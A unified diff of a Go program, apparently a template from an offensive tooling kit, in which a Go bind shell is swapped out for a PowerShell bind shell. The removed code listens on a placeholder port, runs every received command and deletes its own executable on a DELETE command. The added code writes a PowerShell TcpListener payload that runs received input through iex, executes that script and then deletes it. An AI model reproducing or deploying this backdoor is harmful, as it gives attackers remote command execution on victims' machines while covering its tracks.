@@ -1,45 +1,39 @@
 package main
 
 import (
-	"net"
+	"fmt"
+	"io"
 	"os"
 	"os/exec"
-	"strings"
 )
 
-func FUNC_DELETE() {
-	os.Remove(os.Args[0])
+func WRITETOFILE(filename string, data string) error {
+	file, err := os.Create(filename)
+	if err != nil {
+		return fmt.Errorf("can't create a file %s: %v", filename, err)
+	}
+	defer file.Close()
+	_, err = io.WriteString(file, data)
+	if err != nil {
+		return fmt.Errorf("can't write to a file %s: %v", filename, err)
+	}
+	return file.Sync()
 }
 
-func FUNC_HANDLE(conn net.Conn) {
-	for {
-		buffer := make([]byte, 1024)
-		length, _ := conn.Read(buffer)
-		command := string(buffer[:length-1])
-		if command == "DELETE" {
-			FUNC_DELETE()
-			break
-		}
-		parts := strings.Fields(command)
-		head := parts[0]
-		parts = parts[1:]
-		out, _ := exec.Command(head, parts...).Output()
-		conn.Write(out)
+func SHELL() {
+	powershellPayload := `$listener = New-Object System.Net.Sockets.TcpListener('HOST',PORT);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()`
+	err := WRITETOFILE("FILENAME.ps1", powershellPayload)
+	if err != nil {
+		fmt.Printf("%s\n", err)
 	}
-	// conn.Close()
+	powershell := exec.Command("powershell", ".\\FILENAME.ps1")
+	err = powershell.Run()
+	if err != nil {
+		fmt.Printf("%s\n", err)
+	}
+	os.Remove("FILENAME.ps1")
 }
 
 func main() {
-	listen, err := net.Listen("CONN_TYPE", "HOST:PORT")
-	if err != nil {
-		os.Exit(1)
-	}
-	defer listen.Close()
-	for {
-		conn, err := listen.Accept()
-		if err != nil {
-			os.Exit(1)
-		}
-		FUNC_HANDLE(conn)
-	}
+	SHELL()
 }
